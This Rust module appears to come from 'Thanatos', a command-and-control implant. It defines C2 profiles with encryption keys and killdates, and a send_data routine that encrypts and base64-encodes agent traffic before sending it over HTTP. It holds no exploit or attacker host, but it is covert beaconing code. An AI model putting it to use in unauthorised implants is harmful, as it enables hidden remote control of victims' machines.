use agent_utils::{
    crypto::{b64decode, b64encode},
    errors::ThanatosError,
    msg::ExtraInfoC2Profile,
};
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[cfg(feature = "http")]
pub mod http;

/// Definition for an included C2 Profile
#[derive(Debug)]
pub struct C2ProfileDefinition {
    /// ID for the C2 profile
    pub id: usize,

    /// C2 profile name
    pub name: String,

    /// Whether the C2 profile is enabled
    pub enabled: bool,

    /// Whether the profile is defunct
    pub defunct: bool,

    /// Profile's one time use encryption key
    #[cfg(any(feature = "AES", feature = "EKE"))]
    pub enc_key: [u8; 32],

    /// Killdate for the profile
    pub killdate: Duration,

    /// Profile for the definition
    pub handle: EgressProfileHandle,
}

/// Enum for the type of egress profile
#[derive(Debug)]
pub enum EgressProfileHandle {
    /// The profile is an HTTP profile
    HttpProfile(http::HttpProfile),
}

/// Trait defining an Egress profile type.
pub trait EgressProfile {
    /// Sends data to the server
    fn send_data(&mut self, data: &impl AsRef<str>) -> Result<String, ThanatosError>;
}

impl C2ProfileDefinition {
    /// Sends data through the C2 profile and encrypts/decrypts it if necessary
    pub fn send_data<InputType, OutputType>(
        &mut self,
        uuid: &impl AsRef<str>,
        data: &InputType,
    ) -> Result<OutputType, ThanatosError>
    where
        InputType: Serialize,
        OutputType: for<'a> Deserialize<'a>,
    {
        let data = serde_json::to_string(data).map_err(|_| ThanatosError::JsonEncodeError)?;

        #[cfg(feature = "AES")]
        let data = {
            let encrypted = agent_utils::crypto::encrypt_aes(&self.enc_key, data)?;
            b64encode(&[uuid.as_ref().as_bytes(), &encrypted].concat())
        };

        #[cfg(all(not(feature = "AES"), not(feature = "EKE")))]
        let data = b64encode(format!("{}{}", uuid.as_ref(), &data));

        let result = match &mut self.handle {
            EgressProfileHandle::HttpProfile(profile) => {
                agent_utils::debug_invoke!(profile.send_data(&data))
            }
        };

        let decoded = b64decode(result)?;

        #[cfg(all(not(feature = "AES"), not(feature = "EKE")))]
        return serde_json::from_slice(&decoded[36..]).map_err(|_| ThanatosError::JsonDecodeError);

        #[cfg(any(feature = "AES", feature = "EKE"))]
        {
            let decrypted = agent_utils::crypto::decrypt_aes_verify(&self.enc_key, &decoded[36..])?;
            return serde_json::from_slice(&decrypted).map_err(|_| ThanatosError::JsonDecodeError);
        }
    }
}

impl C2ProfileDefinition {
    /// Gets a reference into the C2 profile definition.
    /// Clones the scalar types but gets any other type by reference.
    pub fn borrow_into(&self) -> ExtraInfoC2Profile {
        ExtraInfoC2Profile {
            id: self.id,
            name: &self.name,
            enabled: self.enabled,
            defunct: self.defunct,
        }
    }
}
